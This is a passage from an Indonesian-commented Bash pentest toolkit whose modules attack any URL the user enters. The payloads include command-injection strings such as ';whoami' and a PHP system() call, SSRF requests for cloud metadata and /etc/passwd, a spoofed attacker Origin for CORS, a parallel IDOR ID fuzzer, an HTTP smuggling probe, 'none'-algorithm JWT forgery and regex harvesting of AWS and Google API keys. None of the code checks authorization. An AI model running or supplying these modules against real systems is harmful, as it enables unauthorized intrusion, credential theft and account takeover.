        printf "%-30s | %-20s\n" "COMPONENTS / PATH" "STATUS / FINDING"
        echo "-----------------------------------------------------"
    } > "$filename"

    # 1. Identifikasi CMS Dasar
    page_source=$(curl -s -k -L -A "$ua" "$target")
    
    cms_found="Unknown"
    [[ "$page_source" == *"wp-content"* ]] && cms_found="WordPress"
    [[ "$page_source" == *"joomla"* ]] && cms_found="Joomla"
    [[ "$page_source" == *"Drupal"* ]] && cms_found="Drupal"

    echo -e "  [*] Identifikasi CMS: \e[32m$cms_found\e[0m"
    printf "%-30s | %-20s\n" "CMS Core" "$cms_found" >> "$filename"

    # 2. Cek Kerentanan Spesifik (WordPress sebagai contoh utama)
    findings=0
    if [[ "$cms_found" == "WordPress" ]]; then
        # Cek XML-RPC
        xml_check=$(curl -s -o /dev/null -w "%{http_code}" "$target/xmlrpc.php")
        if [[ "$xml_check" == "200" || "$xml_check" == "405" ]]; then
            echo -e "  [!] Vulnerability: XML-RPC Aktif"
            printf "%-30s | %-20s\n" "/xmlrpc.php" "ENABLED (VULN)" >> "$filename"
            ((findings++))
        fi

        # Cek Directory Listing Uploads
        up_check=$(curl -s -o /dev/null -w "%{http_code}" "$target/wp-content/uploads/")
        if [[ "$up_check" == "200" ]]; then
            echo -e "  [!] Vulnerability: Directory Listing Uploads"
            printf "%-30s | %-20s\n" "/wp-content/uploads/" "OPEN (SENSITIVE)" >> "$filename"
            ((findings++))
        fi
    fi

    # Jika tidak ada temuan spesifik selain deteksi CMS
    if [ $findings -eq 0 ]; then
        printf "%-30s | %-20s\n" "Security Patches" "SEEMS SECURE" >> "$filename"
    fi

    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    echo "KESIMPULAN: AUDIT CMS SELESAI" >> "$filename"
    
    echo -e "[*] Laporan audit CMS tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 10: REMOTE CODE EXECUTION (RCE) SCANNER (DETAILED TABLE) ] ---

function start_rce_scanner {
    clear
    local nama_modul="RCE SCANNER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 10: REMOTE CODE EXECUTION (RCE) SCANNER               "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Mencoba eksekusi perintah OS (Linux/Windows) via parameter URL."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan URL Full (contoh: http://site.com/ping.php?host=): " target

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
        return
    fi

    # Ekstraksi nama domain untuk penamaan file log
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="${domain^^} ${nama_modul}.txt"

    # Payload RCE
    rce_payloads=(
        ";whoami" "|whoami" "&whoami" "\`whoami\`" "$(whoami)"
        ";id" "|id" "&id" "<?php system('whoami'); ?>"
    )

    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"

    echo -e "\n[*] Memulai Fuzzing RCE pada: $target"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "====================================================="
        echo "          REMOTE CODE EXECUTION AUDIT REPORT         "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-25s | %-12s | %-20s\n" "PAYLOAD" "STATUS" "SERVER RESP"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_rce=0
    for payload in "${rce_payloads[@]}"; do
        # URL Encode payload menggunakan python
        encoded_payload=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$payload")
        
        echo -ne "  [*] Testing: $payload \r"
        
        response=$(curl -s -k -L -A "$ua" "$target$encoded_payload")

        # Cek indikator keberhasilan
        if echo "$response" | grep -qiE "uid=|gid=|groups=|www-data|apache|nginx|root|system32"; then
            res_status="VULNERABLE"
            server_resp=$(echo "$response" | grep -iE "uid=|www-data|root" | head -n 1 | cut -c1-20 | tr -d '\n\r')
            color="\e[31m"
            
            echo -e "  [!!!] \e[31mRCE DETECTED!\e[0m -> Payload: $payload"
            echo -e "        Response: $server_resp"
            ((found_rce++))
            
            printf "%-25s | %-12s | %-20s\n" "$payload" "$res_status" "$server_resp" >> "$filename"
            break # Stop jika sudah tembus
        else
            res_status="SECURE"
            server_resp="-"
            printf "%-25s | %-12s | %-20s\n" "$payload" "$res_status" "$server_resp" >> "$filename"
        fi

        sleep 0.2
    done

    # KOREKSI: Membersihkan baris progress (spasi kosong yang cukup)
    echo -ne "                                                                            \r"
    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    
    if [ $found_rce -gt 0 ]; then
        echo -e "\e[31m[!] ALERT: Server Terbuka! Kendali penuh didapatkan.\e[0m"
        echo "KESIMPULAN: CRITICAL VULNERABILITY FOUND (RCE)" >> "$filename"
    else
        echo -e "\e[32m[✓] Scan Selesai. Tidak ditemukan eksekusi perintah langsung.\e[0m"
        echo "KESIMPULAN: NO DIRECT RCE DETECTED" >> "$filename"
    fi
    
    echo -e "[*] Hasil audit RCE tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 11: SERVER-SIDE REQUEST FORGERY (SSRF) (DETAILED TABLE) ] ---

function start_ssrf_tester {
    clear
    local nama_modul="SSRF SCANNER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 11: SERVER-SIDE REQUEST FORGERY (SSRF)                "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Memaksa server mengakses jaringan internal atau metadata cloud."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan URL Parameter (contoh: http://site.com/proxy.php?url=): " target

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
        return
    fi

    # Ekstraksi nama domain untuk penamaan file log
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="${domain^^} ${nama_modul}.txt"

    # Payload SSRF (Cloud Metadata & Internal Service)
    ssrf_payloads=(
        "http://169.254.169.254/latest/meta-data/"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://127.0.0.1:22"
        "http://127.0.0.1:3306"
        "file:///etc/passwd"
        "http://localhost:80"
    )

    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"

    echo -e "\n[*] Memulai Penetrasi SSRF pada: $target"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Header Tabel Log
    {
        echo "====================================================="
        echo "          SSRF VULNERABILITY AUDIT REPORT            "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-40s | %-15s\n" "INTERNAL RESOURCE TESTED" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_ssrf=0
    for payload in "${ssrf_payloads[@]}"; do
        echo -ne "  [*] Testing: $payload \r"
        
        response=$(curl -s -k -L -A "$ua" "$target$payload" --connect-timeout 5)

        # Indikator SSRF Berhasil
        if [[ "$response" == *"ami-id"* || "$response" == *"root:x:"* || "$response" == *"SSH-2.0"* || "$response" == *"computeMetadata"* ]]; then
            res_status="VULNERABLE"
            color="\e[31m"
            echo -e "  [!!!] \e[31mSSRF FOUND:\e[0m $payload"
            ((found_ssrf++))
        else
            res_status="SECURE/TIMEOUT"
            color="\e[0m"
        fi

        printf "%-40s | %-15s\n" "$payload" "$res_status" >> "$filename"
        sleep 0.2
    done

    echo -ne "                                                                            \r"
    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    
    if [ $found_ssrf -gt 0 ]; then
        echo -e "\e[31m[!] ALERT: Server rentan SSRF! Akses internal terdeteksi.\e[0m"
        echo "KESIMPULAN: CRITICAL VULNERABILITY (SSRF)" >> "$filename"
    else
        echo -e "\e[32m[✓] Scan Selesai. Tidak ditemukan kebocoran data internal.\e[0m"
        echo "KESIMPULAN: NO SSRF LEAKAGE DETECTED" >> "$filename"
    fi
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 12: CORS MISCONFIGURATION SCANNER (DETAILED TABLE) ] ---

function start_cors_scanner {
    clear
    local nama_modul="CORS SCANNER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 12: CORS MISCONFIGURATION SCANNER                     "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Menguji kebijakan Cross-Origin (Pencurian Session via AJAX)."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan URL API/Web Target: " target

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
        return
    fi

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="${domain^^} ${nama_modul}.txt"

    attacker_origin="http://evil-attacker.com"
    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"

    echo -e "\n[*] Memeriksa Header CORS pada: $target"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Header Tabel Log
    {
        echo "====================================================="
        echo "          CORS MISCONFIGURATION AUDIT REPORT         "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-30s | %-25s\n" "CORS HEADER" "VALUE/RESULT"
        echo "-----------------------------------------------------"
    } > "$filename"

    # Request dengan Header Origin kustom
    cors_res=$(curl -s -I -k -A "$ua" -H "Origin: $attacker_origin" "$target")

    allow_origin=$(echo "$cors_res" | grep -i "Access-Control-Allow-Origin" | awk '{print $2}' | tr -d '\r')
    allow_creds=$(echo "$cors_res" | grep -i "Access-Control-Allow-Credentials" | awk '{print $2}' | tr -d '\r')

    # Evaluasi Hasil
    status_final="SECURE"
    if [[ "$allow_origin" == "$attacker_origin" ]]; then
        status_final="VULNERABLE (REFLECTED)"
        if [[ "$allow_creds" == *"true"* ]]; then
            status_final="CRITICAL (REFLECTED + CREDS)"
        fi
    elif [[ "$allow_origin" == "*" ]]; then
        status_final="RISKY (WILDCARD)"
    fi

    # Tampilkan di Layar
    echo -e "  [+] ACAO Header: ${allow_origin:-NOT FOUND}"
    echo -e "  [+] ACAC Header: ${allow_creds:-NOT FOUND}"
    echo -e "  [+] Status Audit: $status_final"

    # Tulis ke Log
    printf "%-30s | %-25s\n" "Access-Control-Allow-Origin" "${allow_origin:-None}" >> "$filename"
    printf "%-30s | %-25s\n" "Access-Control-Allow-Credentials" "${allow_creds:-None}" >> "$filename"
    printf "%-30s | %-25s\n" "OVERALL STATUS" "$status_final" >> "$filename"

    echo "-----------------------------------------------------" >> "$filename"
    echo "KESIMPULAN: $status_final" >> "$filename"
    
    echo -e "\n-----------------------------------------------------------------------------"
    echo -e "[*] Hasil audit CORS tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 13: SUBDOMAIN TAKEOVER HUNTER (DETAILED TABLE) ] ---

function start_takeover_hunter {
    clear
    local nama_modul="TAKEOVER HUNTER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 13: SUBDOMAIN TAKEOVER HUNTER                         "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Menganalisis CNAME Record yang mengarah ke layanan pihak ketiga mati."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan Subdomain Target (contoh: dev.site.com): " target

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] Target tidak boleh kosong!\e[0m"
        return
    fi

    # Penamaan file log
    local filename="${target^^} ${nama_modul}.txt"

    echo -e "\n[*] Menganalisis DNS Record untuk: $target"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Log
    {
        echo "====================================================="
        echo "          SUBDOMAIN TAKEOVER AUDIT REPORT            "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-20s | %-30s\n" "DNS TYPE" "VALUE / ALIAS"
        echo "-----------------------------------------------------"
    } > "$filename"

    # Ambil CNAME
    cname=$(host -t CNAME "$target" | awk '/is an alias for/ {print $NF}' | sed 's/\.$//')

    if [[ -z "$cname" ]]; then
        echo -e "  [-] Status: \e[32mAMAN\e[0m (Tidak ditemukan CNAME record)."
        printf "%-20s | %-30s\n" "CNAME" "NOT FOUND" >> "$filename"
    else
        echo -e "  [+] CNAME Terdeteksi: \e[33m$cname\e[0m"
        printf "%-20s | %-30s\n" "CNAME" "$cname" >> "$filename"
        
        # Database Fingerprint
        fingerprints=(
            "GitHub Pages|github.io"
            "Heroku|herokudns.com"
            "Amazon S3|amazonaws.com"
            "Shopify|myshopify.com"
            "Squarespace|squarespace.com"
        )

        found_match=false
        for entry in "${fingerprints[@]}"; do
            service=$(echo $entry | cut -d'|' -f1)
            pattern=$(echo $entry | cut -d'|' -f2)

            if [[ "$cname" == *"$pattern"* ]]; then
                echo -e "  [!!!] \e[31mPOTENSI TAKEOVER:\e[0m Mengarah ke $service"
                echo "-----------------------------------------------------" >> "$filename"
                echo "STATUS: VULNERABLE TO TAKEOVER ($service)" >> "$filename"
                found_match=true
                break
            fi
        done

        if [ "$found_match" = false ]; then
            echo -e "  [-] Status: \e[32mCNAME UNKNOWN\e[0m (Tidak cocok dengan fingerprint umum)."
        fi
    fi

    echo -e "\n-----------------------------------------------------------------------------"
    echo -e "[*] Laporan audit DNS tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 14: CLOUD BUCKET EXPOSURE FINDER (DETAILED TABLE) ] ---

function start_bucket_hunter {
    clear
    local nama_modul="BUCKET HUNTER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 14: CLOUD BUCKET (S3/GCP) EXPOSURE FINDER             "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Mencari storage AWS S3 atau Google Cloud yang terbuka secara publik."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan Nama Bucket/Projek: " bucket_name

    if [[ -z "$bucket_name" ]]; then
        echo -e "\e[31m[!] Nama bucket tidak boleh kosong!\e[0m"
        return
    fi

    local filename="${bucket_name^^} ${nama_modul}.txt"

    echo -e "\n[*] Memulai imbasan pada: $bucket_name"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    # Header Tabel Log
    {
        echo "====================================================="
        echo "          CLOUD BUCKET EXPOSURE REPORT               "
        echo "====================================================="
        echo "BUCKET NAME : $bucket_name"
        echo "DATE        : $(date)"
        echo "-----------------------------------------------------"
        printf "%-15s | %-12s | %-20s\n" "CLOUD PROVIDER" "HTTP CODE" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    # --- 1. AWS S3 ---
    s3_url="http://$bucket_name.s3.amazonaws.com"
    s3_res=$(curl -s -o /dev/null -w "%{http_code}" "$s3_url")
    
    if [[ "$s3_res" == "200" ]]; then
        s3_stat="VULNERABLE (OPEN)"
        echo -e "  [!] AWS S3  : \e[31mOPEN\e[0m"
    elif [[ "$s3_res" == "403" ]]; then
        s3_stat="SECURE (PRIVATE)"
        echo -e "  [-] AWS S3  : \e[32mPRIVATE\e[0m"
    else
        s3_stat="NOT FOUND"
        echo -e "  [-] AWS S3  : \e[34m$s3_res\e[0m"
    fi
    printf "%-15s | %-12s | %-20s\n" "Amazon S3" "$s3_res" "$s3_stat" >> "$filename"

    # --- 2. GCP ---
    gcp_url="https://storage.googleapis.com/$bucket_name"
    gcp_res=$(curl -s -o /dev/null -w "%{http_code}" "$gcp_url")

    if [[ "$gcp_res" == "200" ]]; then
        gcp_stat="VULNERABLE (OPEN)"
        echo -e "  [!] GCP     : \e[31mOPEN\e[0m"
    elif [[ "$gcp_res" == "403" ]]; then
        gcp_stat="SECURE (PRIVATE)"
        echo -e "  [-] GCP     : \e[32mPRIVATE\e[0m"
    else
        gcp_stat="NOT FOUND"
        echo -e "  [-] GCP     : \e[34m$gcp_res\e[0m"
    fi
    printf "%-15s | %-12s | %-20s\n" "Google GCP" "$gcp_res" "$gcp_stat" >> "$filename"

    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    echo -e "[*] Hasil audit bucket tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 15: API ENDPOINT DISCOVERY (DETAILED TABLE) ] ---

function start_api_discovery {
    clear
    local nama_modul="API DISCOVERY"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 15: API ENDPOINT DISCOVERY (REST/GRAPHQL)            "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Mencari jalur API tersembunyi, dokumentasi Swagger, atau GraphQL."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan URL Target (contoh: http://api.site.com/): " target
    [[ "${target: -1}" != "/" ]] && target="$target/"

    if [[ -z "$target" ]]; then
        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"; return
    fi

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="${domain^^} ${nama_modul}.txt"

    api_paths=("api/v1" "api/v2" "graphql" "swagger-ui.html" "api-docs" "v1/swagger.json" "api/v1/user" "api/v1/auth")

    echo -e "\n[*] Memindai API pada: $target"
    echo -e "[*] File Log: $filename"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "          API ENDPOINT DISCOVERY REPORT              "
        echo "====================================================="
        echo "TARGET : $target"
        printf "%-25s | %-12s | %-20s\n" "ENDPOINT PATH" "HTTP CODE" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_api=0
    for path in "${api_paths[@]}"; do
        echo -ne "  [*] Scanning: /$path \r"
        status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "Mozilla/5.0" "$target$path")

        if [[ "$status_code" == "200" || "$status_code" == "401" || "$status_code" == "403" ]]; then
            res_status="FOUND"
            [[ "$status_code" == "401" ]] && res_status="AUTH REQUIRED"
            [[ "$status_code" == "403" ]] && res_status="FORBIDDEN"
            
            color="\e[32m"; [[ "$status_code" != "200" ]] && color="\e[33m"
            echo -e "  [+] /$path -> ${color}$status_code\e[0m ($res_status)"
            printf "%-25s | %-12s | %-20s\n" "/$path" "$status_code" "$res_status" >> "$filename"
            ((found_api++))
        fi
        sleep 0.05
    done

    echo -ne "                                                                            \r"
    echo "-----------------------------------------------------" >> "$filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 16: IDOR TESTER TURBO (MULTI-THREADED + AUDIT TABLE) ] ---

function start_idor_tester {
    clear
    local nama_modul="IDOR TESTER"
    
    echo -e "\e[36m============================================================================="
    echo -e "              MODUL 16: BROKEN ACCESS CONTROL (IDOR) - TURBO                 "
    echo -e "=============================================================================\e[0m"

    read -p "Masukkan URL dengan ID (contoh: http://site.com/api/user?id=100): " target

    if [[ -z "$target" || "$target" != *"="* ]]; then
        echo -e "\e[31m[!] URL harus menyertakan parameter ID!\e[0m"; return
    fi

    # Ekstraksi domain dan persiapan file log
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="${domain^^} ${nama_modul}.txt"
    
    base_url="${target%=*}="
    original_id="${target#*=}"

    # 1. Baseline Request (Untuk pembanding ukuran respon)
    echo -e "[*] Mengambil baseline respon untuk ID asli ($original_id)..."
    baseline_res=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -k "$target")
    baseline_size=$(echo $baseline_res | cut -d':' -f2)
    echo -e "[*] Baseline Size: $baseline_size bytes"

    # --- PENGATURAN MULTI-THREADING ---
    local threads=10             # Jumlah ID yang dicek bersamaan
    local temp_fifo="/tmp/idor_$$.fifo"
    mkfifo "$temp_fifo"
    exec 4<>"$temp_fifo"
    rm "$temp_fifo"
    for ((i=0; i<threads; i++)); do echo >&4; done
    # ----------------------------------

    echo -e "\n[*] Memulai Fuzzing ID (Range: -20 s/d +50)..."
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel Audit
    {
        echo "====================================================="
        echo "          IDOR VULNERABILITY AUDIT REPORT            "
        echo "====================================================="
        echo "TARGET BASE : $base_url"
        echo "BASELINE    : $baseline_size bytes"
        echo "DATE        : $(date)"
        echo "-----------------------------------------------------"
        printf "%-10s | %-12s | %-15s | %-15s\n" "TEST ID" "HTTP CODE" "SIZE (BYTES)" "RESULT"
        echo "-----------------------------------------------------"
    } > "$filename"

    # Fungsi Internal Scanner
    function check_idor {
        local tid=$1
        local b_url=$2
        local b_size=$3
        local log=$4

        local res=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -k "${b_url}${tid}")
        local code=$(echo $res | cut -d':' -f1)
        local size=$(echo $res | cut -d':' -f2)

        if [[ "$code" == "200" ]]; then
            local diff=$((size - b_size))
            local abs_diff=${diff#-}
            
            # Jika ukuran berbeda (tapi tidak terlalu jauh/masih masuk akal sebagai data user)
            if [ $abs_diff -gt 0 ] && [ $abs_diff -lt 5000 ]; then
                local res_status="POTENSI IDOR"
                echo -e "  [\e[32m!\e[0m] ID $tid -> \e[32m200 OK\e[0m (Size Diff: $diff)"
                printf "%-10s | %-12s | %-15s | %-15s\n" "$tid" "$code" "$size" "$res_status" >> "$log"
            fi
        fi
    }

    # Loop pengetesan ID secara paralel
    # Kita cek 20 ID ke belakang dan 50 ID ke depan
    for ((i=-20; i<=50; i++)); do
        [[ $i -eq 0 ]] && continue # Skip ID asli
        test_id=$((original_id + i))
        [[ $test_id -lt 0 ]] && continue

        read -u4 # Ambil jatah thread
        (
            check_idor "$test_id" "$base_url" "$baseline_size" "$filename"
            echo >&4 # Kembalikan jatah thread
        ) &
    done

    wait
    exec 4>&-

    echo -e "-----------------------------------------------------------------------------"
    echo -e "\e[32m[✓] Selesai!\e[0m Temuan IDOR telah dicatat di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 17: HTTP REQUEST SMUGGLING (DETAILED TABLE) ] ---

function start_smuggling_tester {
    clear
    local nama_modul="SMUGGLING TESTER"
    
    echo -e "\e[36m============================================================================="
    echo "                 MODUL 17: HTTP REQUEST SMUGGLING (ADVANCED)                 "
    echo -e "=============================================================================\e[0m"

    read -p "Masukkan URL Target (contoh: http://target.com/): " target
    if [[ -z "$target" ]]; then return; fi

    local domain=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
    local filename="${domain^^} ${nama_modul}.txt"

    echo -e "\n[*] Memeriksa Desinkronisasi HTTP pada: $domain"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "          HTTP REQUEST SMUGGLING AUDIT REPORT        "
        echo "====================================================="
        printf "%-15s | %-20s | %-15s\n" "TECHNIQUE" "DETECTION METHOD" "RESULT"
        echo "-----------------------------------------------------"
    } > "$filename"

    # CL.TE Probe via Python (Raw Socket)
    echo -ne "  [*] Testing CL.TE... \r"
    result_clte=$(python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(7)
try:
    s.connect(('$domain', 80))
    payload = 'POST / HTTP/1.1\r\nHost: $domain\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\n0\r\n\r\n'
    s.sendall(payload.encode())
    s.recv(1024)
    print('SECURE')
except:
    print('VULNERABLE (TIMEOUT)')
" 2>/dev/null)

    echo -e "  [+] CL.TE Result: $result_clte"
    printf "%-15s | %-20s | %-15s\n" "CL.TE" "Time-Delay" "$result_clte" >> "$filename"

    echo "-----------------------------------------------------" >> "$filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 18: JWT DEBUGGER & HACK (DETAILED TABLE) ] ---

function start_jwt_hack {
    clear
    local nama_modul="JWT HACKER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 18: JWT DEBUGGER & AUTH BYPASS HACK                   "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Dekode Token, Manipulasi Payload, dan None-Algorithm Attack."
    echo "-----------------------------------------------------------------------------"

    read -p "Masukkan Token JWT: " jwt_token

    if [[ -z "$jwt_token" || "$jwt_token" != *"."* ]]; then
        echo -e "\e[31m[!] Format JWT tidak valid!\e[0m"; return
    fi

    local filename="JWT_AUDIT_$(date +%s).txt"

    # Dekode Header & Payload
    header_b64=$(echo "$jwt_token" | cut -d'.' -f1)
    payload_b64=$(echo "$jwt_token" | cut -d'.' -f2)

    echo -e "\n\e[34m[*] Hasil Dekode:\e[0m"
    header_json=$(echo "$header_b64" | base64 -d 2>/dev/null)
    payload_json=$(echo "$payload_b64" | base64 -d 2>/dev/null)

    echo -e "  [HEADER]  : $header_json"
    echo -e "  [PAYLOAD] : $payload_json"
    echo "-----------------------------------------------------------------------------"

    # Penulisan ke Log (Tabel)
    {
        echo "====================================================="
        echo "              JWT VULNERABILITY REPORT               "
        echo "====================================================="
        printf "%-25s | %-25s\n" "SECURITY TEST" "RESULT / POC"
        echo "-----------------------------------------------------"
        
        # Test 1: None Algorithm Attack
        new_header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
        none_jwt="${new_header}.${payload_b64}."
        printf "%-25s | %-25s\n" "None Algorithm Attack" "$none_jwt"
        
        # Test 2: Role Check
        if [[ "$payload_json" == *"user"* ]]; then role_res="Vulnerable to Role Mod"; else role_res="Secure"; fi
        printf "%-25s | %-25s\n" "Role Manipulation" "$role_res"
    } > "$filename"

    echo -e "\e[32m[+] Analisis Selesai. POC None-Algorithm tersimpan di: $filename\e[0m"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 19: SECURITY HEADERS & SSL ANALYZER (DETAILED TABLE) ] ---

function start_security_audit {
    clear
    local nama_modul="SECURITY AUDIT"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 19: SECURITY HEADERS & SSL ANALYZER                   "
    echo -e "=============================================================================\e[0m"

    read -p "Masukkan Domain (contoh: site.com): " domain
    [[ -z "$domain" ]] && return
    
    local filename="${domain^^} ${nama_modul}.txt"
    echo -e "\n[*] Memulai Audit pada: $domain"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "         HTTP HEADERS & SSL AUDIT REPORT            "
        echo "====================================================="
        printf "%-30s | %-15s\n" "SECURITY CHECK" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    # 1. Header Analysis
    headers=$(curl -s -I -k "https://$domain")
    check_list=("Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options")

    for h in "${check_list[@]}"; do
        if echo "$headers" | grep -qi "$h"; then
            status="FOUND (SAFE)"
            echo -e "  [\e[32mOK\e[0m] $h"
        else
            status="MISSING (RISK)"
            echo -e "  [\e[31m!!\e[0m] $h"
        fi
        printf "%-30s | %-15s\n" "$h" "$status" >> "$filename"
    done

    # 2. SSL Analysis
    echo -e "\n[*] Mengecek SSL..."
    timeout 2 openssl s_client -connect "$domain":443 -tls1 < /dev/null > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        ssl_res="VULN (TLS 1.0)"
        echo -e "  [\e[31m!!\e[0m] SSL: Mendukung TLS 1.0 (Rentan)"
    else
        ssl_res="SAFE (No TLS 1.0)"
        echo -e "  [\e[32mOK\e[0m] SSL: TLS 1.0 Tidak Aktif"
    fi
    printf "%-30s | %-15s\n" "SSL/TLS Protocol" "$ssl_res" >> "$filename"

    echo -e "\n[*] Laporan lengkap tersimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 20: JAVASCRIPT SECRET FINDER (DETAILED TABLE) ] ---

function start_js_scanner {
    clear
    local nama_modul="JS SECRET FINDER"
    
    echo -e "\e[36m============================================================================="
    echo -e "                 MODUL 20: JAVASCRIPT SECRET & API KEY FINDER                "
    echo -e "=============================================================================\e[0m"

    read -p "Masukkan URL File JS: " js_url
    [[ -z "$js_url" ]] && return

    local domain=$(echo "$js_url" | awk -F[/:] '{print $4}')
    local filename="${domain^^} JS_SECRETS.txt"

    echo -e "\n[*] Menganalisis file JS..."
    js_content=$(curl -s -k -L "$js_url")

    {
        echo "====================================================="
        echo "           JAVASCRIPT STATIC ANALYSIS REPORT         "
        echo "====================================================="
        printf "%-20s | %-40s\n" "CATEGORY" "MATCHED DATA"
        echo "-----------------------------------------------------"
    } > "$filename"

    # Regex Hunting
    # Google API
    g_key=$(echo "$js_content" | grep -oE "AIza[0-9A-Za-z\\-_]{35}" | head -n 1)
    [[ -n "$g_key" ]] && printf "%-20s | %-40s\n" "Google API" "$g_key" >> "$filename" && echo -e "  [+] Terdeteksi Google API Key"

    # AWS Key
    a_key=$(echo "$js_content" | grep -oE "AKIA[0-9A-Z]{16}" | head -n 1)
    [[ -n "$a_key" ]] && printf "%-20s | %-40s\n" "AWS Access Key" "$a_key" >> "$filename" && echo -e "  [+] Terdeteksi AWS Key"

    # Firebase
    f_url=$(echo "$js_content" | grep -oE "[a-z0-9.-]+\.firebaseio\.com" | head -n 1)
